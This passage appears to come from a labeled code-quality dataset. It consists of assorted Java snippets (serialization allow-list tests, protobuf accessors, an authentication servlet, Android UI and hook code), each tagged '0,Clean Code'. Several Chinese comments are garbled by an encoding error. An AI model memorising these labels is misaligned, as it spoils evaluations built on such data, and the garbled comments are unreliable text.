    assertThrows(InsecureException.class,() -> fury.deserialize(bytes));
  }
{
    Fury fury=Fury.builder().requireClassRegistration(false).build();
    AllowListChecker checker=new AllowListChecker(AllowListChecker.CheckLevel.WARN);
    fury.getClassResolver().setClassChecker(checker);
    checker.addListener(fury.getClassResolver());
    byte[] bytes=fury.serialize(new AllowListCheckerTest());
    checker.disallowClass(""org.apache.fury.*"");
    assertThrows(InsecureException.class,() -> fury.serialize(new AllowListCheckerTest()));
    assertThrows(InsecureException.class,() -> fury.deserialize(bytes));
  }
}
",0,Clean Code
"/** 
 * <code>optional uint32 challenge_id = 6;</code>
 * @return the challengeId
 */
public int getChallengeId(){
  return challengeId;
}",0,Clean Code
"private FMClassificationModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private FMClassificationModelProto(){
}
!org.eclipse.jdt.core.dom.MethodDeclaration@47abc55",0,Clean Code
"public GenerateImageRequest build(){
  return new GenerateImageRequest(textPrompts,height,width,cfgScale,clipGuidancePreset,sampler,samples,seed,steps,stylePreset);
}
public StabilityAiImageOptions build(){
  return options;
}
",0,Clean Code
"private boolean isOnBed(){
  BlockPos.Mutable blockPos=mc.player.getBlockPos().mutableCopy();
  if (check(blockPos,0,0))   return true;
  double xa=mc.player.getX() - blockPos.getX();
  double za=mc.player.getZ() - blockPos.getZ();
  if (xa >= 0 && xa <= 0.3 && check(blockPos,-1,0))   return true;
  if (xa >= 0.7 && check(blockPos,1,0))   return true;
  if (za >= 0 && za <= 0.3 && check(blockPos,0,-1))   return true;
  if (za >= 0.7 && check(blockPos,0,1))   return true;
  if (xa >= 0 && xa <= 0.3 && za >= 0 && za <= 0.3 && check(blockPos,-1,-1))   return true;
  if (xa >= 0 && xa <= 0.3 && za >= 0.7 && check(blockPos,-1,1))   return true;
  if (xa >= 0.7 && za >= 0 && za <= 0.3 && check(blockPos,1,-1))   return true;
  return xa >= 0.7 && za >= 0.7 && check(blockPos,1,1);
}",0,Clean Code
"public static boolean checkIgnoreSql(String spanName){
  for (  String api : TrackerConstants.ignoreInnerSql) {
    if (spanName.contains(api)) {
      return true;
    }
  }
  return false;
}
",0,Clean Code
"@Override @TruffleBoundary public String toString(){
  return String.format(""(%s:%d) %s"",sourceSection.getSource().getName(),sourceSection.getStartLine(),sourceSection.getCharacters());
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code ChessRogueUpdateMoneyInfoScNotify}
 */
public static ChessRogueUpdateMoneyInfoScNotify newInstance(){
  return new ChessRogueUpdateMoneyInfoScNotify();
}
",0,Clean Code
"/** 
 * 鏋勫缓鑺傜偣鎺掑簭鐨勫弬鏁�
 * @param request           鎷栨嫿鐨勫墠绔姹傚弬鏁�
 * @param selectIdNodeFunc  閫氳繃id鏌ヨ鑺傜偣鐨勫嚱鏁�
 * @param selectPosNodeFunc 閫氳繃parentId鍜宲os杩愮畻绗︽煡璇㈣妭鐐圭殑鍑芥暟
 * @return
 */
public NodeSortDTO getNodeSortDTO(NodeMoveRequest request,Function<String,BaseModule> selectIdNodeFunc,Function<NodeSortQueryParam,BaseModule> selectPosNodeFunc){
  if (StringUtils.equals(request.getDragNodeId(),request.getDropNodeId())) {
    throw new MSException(Translator.get(""invalid_parameter"") + "": drag node  and drop node"");
  }
  BaseModule dragNode=selectIdNodeFunc.apply(request.getDragNodeId());
  if (dragNode == null) {
    throw new MSException(Translator.get(DRAG_NODE_NOT_EXIST) + "":"" + request.getDragNodeId());
  }
  BaseModule dropNode=selectIdNodeFunc.apply(request.getDropNodeId());
  if (dropNode == null) {
    throw new MSException(Translator.get(DRAG_NODE_NOT_EXIST) + "":"" + request.getDropNodeId());
  }
  BaseModule parentModule;
  BaseModule previousNode;
  BaseModule nextNode=null;
  if (request.getDropPosition() == 0) {
    parentModule=new BaseModule(dropNode.getId(),dropNode.getName(),dropNode.getPos(),dropNode.getProjectId(),dropNode.getParentId());
    NodeSortQueryParam sortParam=new NodeSortQueryParam();
    sortParam.setParentId(dropNode.getId());
    sortParam.setOperator(MOVE_POS_OPERATOR_LATEST);
    previousNode=selectPosNodeFunc.apply(sortParam);
  }
 else {
    if (StringUtils.equalsIgnoreCase(dropNode.getParentId(),ModuleConstants.ROOT_NODE_PARENT_ID)) {
      parentModule=new BaseModule(ModuleConstants.ROOT_NODE_PARENT_ID,ModuleConstants.ROOT_NODE_PARENT_ID,0,dragNode.getProjectId(),ModuleConstants.ROOT_NODE_PARENT_ID);
    }
 else {
      parentModule=selectIdNodeFunc.apply(dropNode.getParentId());
    }
    if (request.getDropPosition() == 1) {
      previousNode=dropNode;
      NodeSortQueryParam sortParam=new NodeSortQueryParam();
      sortParam.setParentId(parentModule.getId());
      sortParam.setPos(previousNode.getPos());
      sortParam.setOperator(MOVE_POS_OPERATOR_MORE);
      nextNode=selectPosNodeFunc.apply(sortParam);
    }
 else     if (request.getDropPosition() == -1) {
      nextNode=dropNode;
      NodeSortQueryParam sortParam=new NodeSortQueryParam();
      sortParam.setParentId(parentModule.getId());
      sortParam.setPos(nextNode.getPos());
      sortParam.setOperator(MOVE_POS_OPERATOR_LESS);
      previousNode=selectPosNodeFunc.apply(sortParam);
    }
 else {
      throw new MSException(Translator.get(""invalid_parameter"") + "": dropPosition"");
    }
  }
  return new NodeSortDTO(dragNode,parentModule,previousNode,nextNode);
}",0,Clean Code
"private String setDatabaseInJdbcUrl(ConnectInfo connectInfo){
  String databaseName;
  String url=connectInfo.getUrl();
  if (StringUtils.isBlank((databaseName=connectInfo.getDatabaseName())) && StringUtils.isBlank((databaseName=connectInfo.getSchemaName()))) {
    return url;
  }
  String connectAddress=connectInfo.getHost() + "":"" + connectInfo.getPort();
  String[] addressSplit=url.split(connectAddress);
  String connectParams=addressSplit[1];
  if (connectParams.startsWith(""/"")) {
    connectParams=connectParams.substring(1);
  }
  return addressSplit[0] + connectAddress + ""/""+ databaseName+ connectParams;
}",0,Clean Code
"public Builder topK(Integer topK){
  this.topK=topK;
  return this;
}
",0,Clean Code
"@Override public final DevelopmentType forName(final CharSequence value){
switch (value.length()) {
case 16:
{
      if (ProtoUtil.isEqual(""DEVELOPMENT_NONE"",value)) {
        return DEVELOPMENT_NONE;
      }
      break;
    }
case 23:
{
    if (ProtoUtil.isEqual(""DEVELOPMENT_ROGUE_CHESS"",value)) {
      return DEVELOPMENT_ROGUE_CHESS;
    }
    break;
  }
case 24:
{
  if (ProtoUtil.isEqual(""DEVELOPMENT_ROGUE_COSMOS"",value)) {
    return DEVELOPMENT_ROGUE_COSMOS;
  }
  if (ProtoUtil.isEqual(""DEVELOPMENT_ACTIVITY_END"",value)) {
    return DEVELOPMENT_ACTIVITY_END;
  }
  break;
}
case 25:
{
if (ProtoUtil.isEqual(""DEVELOPMENT_UNLOCK_AVATAR"",value)) {
  return DEVELOPMENT_UNLOCK_AVATAR;
}
break;
}
case 26:
{
if (ProtoUtil.isEqual(""DEVELOPMENT_ACTIVITY_START"",value)) {
return DEVELOPMENT_ACTIVITY_START;
}
break;
}
case 27:
{
if (ProtoUtil.isEqual(""DEVELOPMENT_STORY_CHALLENGE"",value)) {
return DEVELOPMENT_STORY_CHALLENGE;
}
break;
}
case 28:
{
if (ProtoUtil.isEqual(""DEVELOPMENT_ROGUE_CHESS_NOUS"",value)) {
return DEVELOPMENT_ROGUE_CHESS_NOUS;
}
if (ProtoUtil.isEqual(""DEVELOPMENT_MEMORY_CHALLENGE"",value)) {
return DEVELOPMENT_MEMORY_CHALLENGE;
}
if (ProtoUtil.isEqual(""DEVELOPMENT_UNLOCK_EQUIPMENT"",value)) {
return DEVELOPMENT_UNLOCK_EQUIPMENT;
}
break;
}
}
return null;
}",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof RogueRerollBuff)) {
    return false;
  }
  RogueRerollBuff other=(RogueRerollBuff)o;
  return bitField0_ == other.bitField0_ && (!hasBuffSelectInfo() || buffSelectInfo.equals(other.buffSelectInfo));
}",0,Clean Code
"@Override protected void doGet(HttpServletRequest req,HttpServletResponse resp) throws IOException, ServletException {
  String email=InputParser.getQueryParamOrThrowError(req,""email"",true);
  String phoneNumber=Utils.normalizeIfPhoneNumber(InputParser.getQueryParamOrThrowError(req,""phoneNumber"",true));
  String deviceId=InputParser.getQueryParamOrThrowError(req,""deviceId"",true);
  String deviceIdHash=InputParser.getQueryParamOrThrowError(req,""preAuthSessionId"",true);
  if (Stream.of(email,phoneNumber,deviceId,deviceIdHash).filter(Objects::nonNull).count() != 1) {
    throw new ServletException(new BadRequestException(""Please provide exactly one of email, phoneNumber, deviceId or preAuthSessionId""));
  }
  try {
    TenantIdentifier tenantIdentifier=getTenantIdentifier(req);
    Storage storage=getTenantStorage(req);
    long passwordlessCodeLifetime=Config.getConfig(tenantIdentifier,main).getPasswordlessCodeLifetime();
    List<Passwordless.DeviceWithCodes> devicesInfos;
    if (deviceId != null) {
      DeviceWithCodes deviceWithCodes=Passwordless.getDeviceWithCodesById(tenantIdentifier,storage,deviceId);
      devicesInfos=deviceWithCodes == null ? Collections.emptyList() : Collections.singletonList(deviceWithCodes);
    }
 else     if (deviceIdHash != null) {
      DeviceWithCodes deviceWithCodes=Passwordless.getDeviceWithCodesByIdHash(tenantIdentifier,storage,deviceIdHash);
      devicesInfos=deviceWithCodes == null ? Collections.emptyList() : Collections.singletonList(deviceWithCodes);
    }
 else     if (email != null) {
      email=Utils.normaliseEmail(email);
      devicesInfos=Passwordless.getDevicesWithCodesByEmail(tenantIdentifier,storage,email);
    }
 else {
      devicesInfos=Passwordless.getDevicesWithCodesByPhoneNumber(tenantIdentifier,storage,phoneNumber);
    }
    JsonObject result=new JsonObject();
    result.addProperty(""status"",""OK"");
    JsonArray jsonDeviceArr=new JsonArray();
    for (    Passwordless.DeviceWithCodes deviceInfo : devicesInfos) {
      JsonObject jsonDevice=new JsonObject();
      jsonDevice.addProperty(""preAuthSessionId"",deviceInfo.device.deviceIdHash);
      jsonDevice.addProperty(""failedCodeInputAttemptCount"",deviceInfo.device.failedAttempts);
      if (deviceInfo.device.email != null) {
        jsonDevice.addProperty(""email"",deviceInfo.device.email);
      }
      if (deviceInfo.device.phoneNumber != null) {
        jsonDevice.addProperty(""phoneNumber"",deviceInfo.device.phoneNumber);
      }
      JsonArray jsonCodeArr=new JsonArray();
      for (      PasswordlessCode code : deviceInfo.codes) {
        JsonObject jsonCode=new JsonObject();
        jsonCode.addProperty(""codeId"",code.id);
        jsonCode.addProperty(""timeCreated"",code.createdAt);
        jsonCode.addProperty(""codeLifetime"",passwordlessCodeLifetime);
        jsonCodeArr.add(jsonCode);
      }
      jsonDevice.add(""codes"",jsonCodeArr);
      jsonDeviceArr.add(jsonDevice);
    }
    result.add(""devices"",jsonDeviceArr);
    super.sendJsonResponse(200,result,resp);
  }
 catch (  Base64EncodingException ex) {
    throw new ServletException(new BadRequestException(""Input encoding error in "" + ex.source));
  }
catch (  NoSuchAlgorithmException|StorageQueryException|TenantOrAppNotFoundException e) {
    throw new ServletException(e);
  }
}",0,Clean Code
"public void toChips(LayoutInflater inflater,ChipGroup group){
  Context ctx=inflater.getContext();
  if (!showMasked)   addChip(inflater,group,R.id.not_hidden,ctx.getString(R.string.not_hidden_filter));
  if (onlyBlacklisted)   addChip(inflater,group,R.id.blacklisted,ctx.getString(R.string.malicious_connection_filter));
  if (onlyCleartext)   addChip(inflater,group,R.id.only_cleartext,ctx.getString(R.string.cleartext_connection));
  if (status != Status.STATUS_INVALID) {
    String label=String.format(ctx.getString(R.string.status_filter),ConnectionDescriptor.getStatusLabel(status,ctx));
    addChip(inflater,group,R.id.status_ind,label);
  }
  if (decStatus != DecryptionStatus.INVALID) {
    String label=String.format(ctx.getString(R.string.decryption_filter),ConnectionDescriptor.getDecryptionStatusLabel(decStatus,ctx));
    addChip(inflater,group,R.id.decryption_status,label);
  }
  if (filteringStatus != FilteringStatus.INVALID) {
    String label=ctx.getString(R.string.firewall_filter,ctx.getString((filteringStatus == FilteringStatus.BLOCKED) ? R.string.blocked_connection_filter : R.string.allowed_connection_filter));
    addChip(inflater,group,R.id.firewall,label);
  }
  if (iface != null)   addChip(inflater,group,R.id.capture_interface,String.format(ctx.getString(R.string.interface_filter),iface));
}
",0,Clean Code
"/** 
 * Start an allocated thread.
 * @param runnable the task or {@code null}
 * @return {@code true} if the thread was started, {@code false} otherwise
 * @throws RejectedExecutionException if {@code runnable} is not {@code null} and the thread could not be created or started
 */
boolean doStartThread(Runnable runnable) throws RejectedExecutionException {
  Thread thread;
  try {
    thread=threadFactory.newThread(new ThreadBody(runnable));
  }
 catch (  Throwable t) {
    if (runnable != null) {
      if (UPDATE_STATISTICS)       rejectedTaskCounter.increment();
      rejectException(runnable,t);
    }
    return false;
  }
  if (thread == null) {
    if (runnable != null) {
      if (UPDATE_STATISTICS)       rejectedTaskCounter.increment();
      rejectNoThread(runnable);
    }
    return false;
  }
  try {
    thread.start();
  }
 catch (  Throwable t) {
    if (runnable != null) {
      if (UPDATE_STATISTICS)       rejectedTaskCounter.increment();
      rejectException(runnable,t);
    }
    return false;
  }
  return true;
}
",0,Clean Code
"@Override public String getColumnName(int columnIndex){
switch (columnIndex) {
case 0:
    return ""#"";
case 1:
  return ""extensionMethod"";
case 2:
return ""requestMethod"";
case 3:
return ""url"";
case 4:
return ""statusCode"";
case 5:
return ""issue"";
case 6:
return ""startTime"";
case 7:
return ""endTime"";
}
return null;
}",0,Clean Code
"IGProEnterAVChannelPermissionInfo getPermissionInfo();
",0,Clean Code
"public static Map<String,Object> toMap(List<KeyValue> keyValues){
  if (CollectionUtils.isEmpty(keyValues)) {
    return Maps.newHashMap();
  }
 else {
    Map<String,Object> map=Maps.newHashMap();
    keyValues.forEach(keyValue -> map.put(keyValue.getKey(),String.valueOf(keyValue.getValue())));
    return map;
  }
}
",0,Clean Code
"/** 
 * Search for tasks based in payload and other parameters. Use sort options as ASC or DESC e.g. sort=name or sort=workflowId. If order is not specified, defaults to ASC.
 * @param start Start index of pagination
 * @param size Number of entries
 * @param sort Sorting type ASC|DESC
 * @param freeText Text you want to search
 * @param query Query you want to search
 * @return instance of {@link SearchResult}
 */
public SearchResult<Task> searchV2(int start,int size,String sort,String freeText,String query){
  return executionService.getSearchTasksV2(query,freeText,start,size,sort);
}",0,Clean Code
"/** 
 * <code>optional uint32 uid = 6;</code>
 * @return the uid
 */
public int getUid(){
  return uid;
}",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)66);
    output.writeMessageNoTag(groupStateInfo);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeMessage(FieldNames.groupStateInfo,groupStateInfo);
  }
  output.endObject();
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.interop.onnx.protos.ExampleTransformerProto)) {
    return super.equals(obj);
  }
  org.tribuo.interop.onnx.protos.ExampleTransformerProto other=(org.tribuo.interop.onnx.protos.ExampleTransformerProto)obj;
  if (getVersion() != other.getVersion())   return false;
  if (!getClassName().equals(other.getClassName()))   return false;
  if (hasSerializedData() != other.hasSerializedData())   return false;
  if (hasSerializedData()) {
    if (!getSerializedData().equals(other.getSerializedData()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"/** 
 * 瀵硅鍒掕繘琛屾帓搴忓拰濉厖鍗犱綅鐨勭┖璁″垝
 * @param plans 璁″垝鍒楄〃, 浼犲叆鐨勮鍒掑垪琛ㄩ渶瑕佹彁鍓嶆寜 {@link PlanDayRes#getPlanDate()} 鍗囧簭
 * @return 鎺掑簭鍚庣殑璁″垝鍒楄〃, 娉ㄦ剰骞朵笉鏄湪 List 涓繘琛屾帓搴�, 鑰屾槸琛ュ厖浜� sort 瀛楁
 */
public static List<PlanDayRes> sort(List<PlanDayRes> plans){
  if (CollUtil.isEmpty(plans)) {
    return plans;
  }
  Map<String,List<PlanDayRes>> byDay=byDay(plans);
  Map<Long,List<PlanDayRes>> byGroupId=byGroupId(plans);
  plans.forEach(p -> p.setSort(-1));
  byDay.forEach((date,list) -> {
    list.sort((p1,p2) -> SortUtil.strSort.compare(p1.getPlanStartTime(),p2.getPlanStartTime()));
    for (    PlanDayRes plan : list) {
      if (plan.getSort() == null) {
        plan.setSort(-1);
      }
      if (plan.getSort() > -1) {
        continue;
      }
      for (int i=0; i < list.size(); i++) {
        final int targetSort=i;
        boolean targetSortHasUsed=list.stream().anyMatch(p -> p.getSort() == targetSort && p.getId() > 0);
        if (targetSortHasUsed) {
          continue;
        }
        for (        PlanDayRes groupPlan : byGroupId.get(plan.getGroupId())) {
          groupPlan.setSort(targetSort);
        }
        break;
      }
    }
    for (int i=0; i < list.stream().mapToInt(PlanDayRes::getSort).max().getAsInt(); i++) {
      final int targetSort=i;
      if (list.stream().noneMatch(p -> p.getSort() == targetSort)) {
        plans.add(getHolderPlan(date,targetSort));
      }
    }
  }
);
  return plans;
}",0,Clean Code
"public WebPageResult(){
  this.success=Boolean.TRUE;
  this.data=new Page<>();
}
private WebPageResult(List<T> data,Long total,Long pageNo,Long pageSize){
  this.success=Boolean.TRUE;
  this.data=new Page<>(data,total,pageNo,pageSize);
}
private WebPageResult(List<T> data,Long total,Integer pageNo,Integer pageSize){
  this.success=Boolean.TRUE;
  this.data=new Page<>(data,total,pageNo,pageSize);
}
",0,Clean Code
"@Override public BlackInfo copyFrom(final BlackInfo other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    beginTime=other.beginTime;
    endTime=other.endTime;
    limitLevel=other.limitLevel;
    banType=other.banType;
  }
  return this;
}",0,Clean Code
"private void updateFiltersView(boolean showMediaFilters,ArrayList<Object> users,ArrayList<FiltersView.DateData> dates,boolean archive,boolean animated){
  if (!searchIsShowed || onlySelect && !(initialDialogsType == 3 && NekoConfig.showTabsOnForward.Bool())) {
    return;
  }
  boolean hasMediaFilter=false;
  boolean hasUserFilter=false;
  boolean hasDateFilter=false;
  boolean hasArchiveFilter=false;
  ArrayList<FiltersView.MediaFilterData> currentSearchFilters=searchViewPager.getCurrentSearchFilters();
  for (int i=0; i < currentSearchFilters.size(); i++) {
    if (currentSearchFilters.get(i).isMedia()) {
      hasMediaFilter=true;
    }
 else     if (currentSearchFilters.get(i).filterType == FiltersView.FILTER_TYPE_CHAT) {
      hasUserFilter=true;
    }
 else     if (currentSearchFilters.get(i).filterType == FiltersView.FILTER_TYPE_DATE) {
      hasDateFilter=true;
    }
 else     if (currentSearchFilters.get(i).filterType == FiltersView.FILTER_TYPE_ARCHIVE) {
      hasArchiveFilter=true;
    }
  }
  if (hasArchiveFilter) {
    archive=false;
  }
  boolean visible=false;
  boolean hasUsersOrDates=(users != null && !users.isEmpty()) || (dates != null && !dates.isEmpty() || archive);
  if (!hasMediaFilter && !hasUsersOrDates && showMediaFilters) {
  }
 else   if (hasUsersOrDates) {
    ArrayList<Object> finalUsers=(users != null && !users.isEmpty() && !hasUserFilter) ? users : null;
    ArrayList<FiltersView.DateData> finalDates=(dates != null && !dates.isEmpty() && !hasDateFilter) ? dates : null;
    if (finalUsers != null || finalDates != null || archive) {
      visible=true;
      filtersView.setUsersAndDates(finalUsers,finalDates,archive);
    }
  }
  if (!visible) {
    filtersView.setUsersAndDates(null,null,false);
  }
  if (!animated) {
    filtersView.getAdapter().notifyDataSetChanged();
  }
  if (searchTabsView != null) {
    searchTabsView.hide(visible,true);
  }
  filtersView.setEnabled(visible);
  filtersView.setVisibility(View.VISIBLE);
}",0,Clean Code
"void cancelReq(NetReq netReq);
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)40);
    output.writeUInt32NoTag(retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)56);
    output.writeUInt32NoTag(propState);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRawByte((byte)88);
    output.writeUInt32NoTag(propEntityId);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.retcode,retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeUInt32(FieldNames.propState,propState);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeUInt32(FieldNames.propEntityId,propEntityId);
  }
  output.endObject();
}",0,Clean Code
"public abstract UploadExcelBO getUploadExcelBO();
",0,Clean Code
"@Test public void test4(){
  MySqlCreateTableStatement x=new MySqlCreateTableStatement();
  x.setTableName(""ff"");
  x.setComment(new MySqlCharExpr(null));
  SQLColumnDefinition c=new SQLColumnDefinition();
  x.addColumn(c);
  c.setName(""name"");
  SQLDataTypeImpl sqlDataType=new SQLDataTypeImpl();
  sqlDataType.setName(""varchar(32)"");
  c.setDataType(sqlDataType);
  c.addConstraint(new SQLNotNullConstraint());
  c.setComment(new MySqlCharExpr(""xname""));
  log.info(x.toString());
}",0,Clean Code
"public AzureBlobPayloadStorage(IDGenerator idGenerator,AzureBlobProperties properties){
  this.idGenerator=idGenerator;
  workflowInputPath=properties.getWorkflowInputPath();
  workflowOutputPath=properties.getWorkflowOutputPath();
  taskInputPath=properties.getTaskInputPath();
  taskOutputPath=properties.getTaskOutputPath();
  expirationSec=properties.getSignedUrlExpirationDuration().getSeconds();
  String connectionString=properties.getConnectionString();
  String containerName=properties.getContainerName();
  String endpoint=properties.getEndpoint();
  String sasToken=properties.getSasToken();
  BlobContainerClientBuilder blobContainerClientBuilder=new BlobContainerClientBuilder();
  if (connectionString != null) {
    blobContainerClientBuilder.connectionString(connectionString);
    sasTokenCredential=null;
  }
 else   if (endpoint != null) {
    blobContainerClientBuilder.endpoint(endpoint);
    if (sasToken != null) {
      sasTokenCredential=SasTokenCredential.fromSasTokenString(sasToken);
      blobContainerClientBuilder.sasToken(sasTokenCredential.getSasToken());
    }
 else {
      sasTokenCredential=null;
    }
  }
 else {
    String msg=""Missing property for connectionString OR endpoint"";
    LOGGER.error(msg);
    throw new NonTransientException(msg);
  }
  blobContainerClient=blobContainerClientBuilder.containerName(containerName).buildClient();
}
",0,Clean Code
"private void onMotionEvent(XC_MethodHook.MethodHookParam param,boolean isOverViewListener){
  MotionEvent e=(MotionEvent)param.args[0];
  boolean mPassedWindowMoveSlop=isOverViewListener || getBooleanField(param.thisObject,""mPassedWindowMoveSlop"");
  int action=e.getActionMasked();
  int pointers=e.getPointerCount();
  if (action == MotionEvent.ACTION_DOWN) {
    saveFocusedTask();
    FCHandled=false;
    swipeType=SWIPE_NONE;
    if (isOverViewListener && getBooleanField(param.thisObject,""mStartingInActivityBounds"")) {
      return;
    }
    mSwipeUpThreshold=e.getY() * (1f - swipeUpPercentage);
    mLongThreshold=e.getY() / 10f;
    isLandscape=e.getY() < displayW;
    int currentW=isLandscape ? displayH : displayW;
    if (pointers == 1) {
      if (leftSwipeUpAction != NO_ACTION && e.getX() < currentW * leftSwipeUpPercentage) {
        swipeType=SWIPE_LEFT;
      }
 else       if (rightSwipeUpAction != NO_ACTION && e.getX() > currentW * (1f - rightSwipeUpPercentage)) {
        swipeType=SWIPE_RIGHT;
      }
    }
  }
  if (twoFingerSwipeUpAction != NO_ACTION && pointers == 2 && swipeType != SWIPE_TWO_FINGER) {
    swipeType=SWIPE_TWO_FINGER;
  }
  if (mPassedWindowMoveSlop && swipeType != SWIPE_NONE) {
    param.setResult(null);
  }
  if (pointers == 1) {
    boolean FCAllowed=swipeType == SWIPE_NONE;
    if (FCAllowed && FCLongSwipeEnabled && e.getY() < mLongThreshold && !FCHandled && !isOverViewListener) {
      setObjectField(param.thisObject,""mActivePointerId"",MotionEvent.INVALID_POINTER_ID);
      setObjectField(param.thisObject,""mPassedWindowMoveSlop"",false);
      FCHandled=true;
      runAction(ACTION_KILL_APP);
    }
  }
  if (action == MotionEvent.ACTION_UP && swipeType != SWIPE_NONE) {
    if (!isOverViewListener) {
      callMethod(param.thisObject,""forceCancelGesture"",e);
    }
    if (e.getY() < mSwipeUpThreshold) {
switch (swipeType) {
case SWIPE_LEFT:
        runAction(leftSwipeUpAction);
      break;
case SWIPE_RIGHT:
    runAction(rightSwipeUpAction);
  break;
case SWIPE_TWO_FINGER:
runAction(twoFingerSwipeUpAction);
break;
}
swipeType=SWIPE_NONE;
}
currentFocusedTask=null;
}
}",0,Clean Code
"/** 
 * <pre> 鍒涘缓鏃堕棿 </pre> <code>string createTime = 8;</code>
 * @return The bytes for createTime.
 */
public com.google.protobuf.ByteString getCreateTimeBytes(){
  Object ref=createTime_;
  if (ref instanceof String) {
    com.google.protobuf.ByteString b=com.google.protobuf.ByteString.copyFromUtf8((String)ref);
    createTime_=b;
    return b;
  }
 else {
    return (com.google.protobuf.ByteString)ref;
  }
}",0,Clean Code
"public void updateRotation(){
  if (cameraInfo == null) {
    return;
  }
  try {
    updateCameraInfo();
  }
 catch (  Throwable throwable) {
    FileLog.e(throwable);
    return;
  }
  Camera camera=destroyed ? null : cameraInfo.camera;
  displayOrientation=getDisplayOrientation(info,true);
  int cameraDisplayOrientation;
  if (""samsung"".equals(Build.MANUFACTURER) && ""sf2wifixx"".equals(Build.PRODUCT)) {
    cameraDisplayOrientation=0;
  }
 else {
    int degrees=0;
    int temp=displayOrientation;
switch (temp) {
case Surface.ROTATION_0:
      degrees=0;
    break;
case Surface.ROTATION_90:
  degrees=90;
break;
case Surface.ROTATION_180:
degrees=180;
break;
case Surface.ROTATION_270:
degrees=270;
break;
}
if (info.orientation % 90 != 0) {
info.orientation=0;
}
if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
temp=(info.orientation + degrees) % 360;
temp=(360 - temp) % 360;
}
 else {
temp=(info.orientation - degrees + 360) % 360;
}
cameraDisplayOrientation=temp;
}
currentOrientation=cameraDisplayOrientation;
if (camera != null) {
try {
camera.setDisplayOrientation(currentOrientation);
}
 catch (Throwable ignore) {
}
}
diffOrientation=currentOrientation - displayOrientation;
if (diffOrientation < 0) {
diffOrientation+=360;
}
}",0,Clean Code
"private RequestConfig prepareRequestConfig(){
  return RequestConfig.custom().setConnectTimeout(config.getRequestTimeOutMsConnect()).setSocketTimeout(config.getRequestTimeoutMsread()).setConnectionRequestTimeout(config.getRequestTimeoutMsConnMgr()).build();
}
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)56);
    output.writeUInt32NoTag(retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)64);
    output.writeUInt32NoTag(index);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRawByte((byte)50);
    output.writeStringNoTag(name);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.retcode,retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeUInt32(FieldNames.index,index);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeString(FieldNames.name,name);
  }
  output.endObject();
}",0,Clean Code
"private void setValue(){
  if (valueSet)   return;
  final long selfId=getUserConfig().getClientUserId();
  TLRPC.UserFull userFull=getMessagesController().getUserFull(selfId);
  if (userFull == null) {
    getMessagesController().loadUserInfo(getUserConfig().getCurrentUser(),true,getClassGuid());
    return;
  }
  currentValue=userFull.business_away_message;
  hasHours=userFull.business_work_hours != null;
  enabled=currentValue != null;
  exclude=currentValue != null ? currentValue.recipients.exclude_selected : true;
  offline_only=currentValue != null ? currentValue.offline_only : true;
  if (recipientsHelper != null) {
    recipientsHelper.setValue(currentValue == null ? null : currentValue.recipients);
  }
  if (currentValue != null && currentValue.schedule instanceof TLRPC.TL_businessAwayMessageScheduleCustom) {
    schedule=currentValueScheduleType=SCHEDULE_CUSTOM;
    scheduleCustomStart=currentScheduleCustomStart=((TLRPC.TL_businessAwayMessageScheduleCustom)currentValue.schedule).start_date;
    scheduleCustomEnd=currentScheduleCustomEnd=((TLRPC.TL_businessAwayMessageScheduleCustom)currentValue.schedule).end_date;
  }
 else {
    scheduleCustomStart=getConnectionsManager().getCurrentTime();
    scheduleCustomEnd=getConnectionsManager().getCurrentTime() + 60 * 60 * 24;
    if (currentValue != null && currentValue.schedule instanceof TLRPC.TL_businessAwayMessageScheduleAlways) {
      schedule=currentValueScheduleType=SCHEDULE_ALWAYS;
    }
 else     if (currentValue != null && currentValue.schedule instanceof TLRPC.TL_businessAwayMessageScheduleOutsideWorkHours) {
      schedule=currentValueScheduleType=SCHEDULE_OUTSIDE_HOURS;
    }
 else {
      schedule=currentValueScheduleType=SCHEDULE_ALWAYS;
    }
  }
  if (listView != null && listView.adapter != null) {
    listView.adapter.update(true);
  }
  checkDone(true);
  valueSet=true;
}",0,Clean Code
"public static void parseChainJson(List<JsonNode> flowJsonObjectList,Set<String> chainIdSet,Consumer<JsonNode> parseOneChainConsumer){
  Map<String,JsonNode> abstratChainMap=new HashMap<>();
  Set<JsonNode> implChainSet=new HashSet<>();
  flowJsonObjectList.forEach(jsonObject -> {
    Iterator<JsonNode> iterator=jsonObject.get(FLOW).get(CHAIN).elements();
    while (iterator.hasNext()) {
      JsonNode innerJsonObject=iterator.next();
      JsonNode chainNameJsonNode=Optional.ofNullable(innerJsonObject.get(ID)).orElse(innerJsonObject.get(NAME));
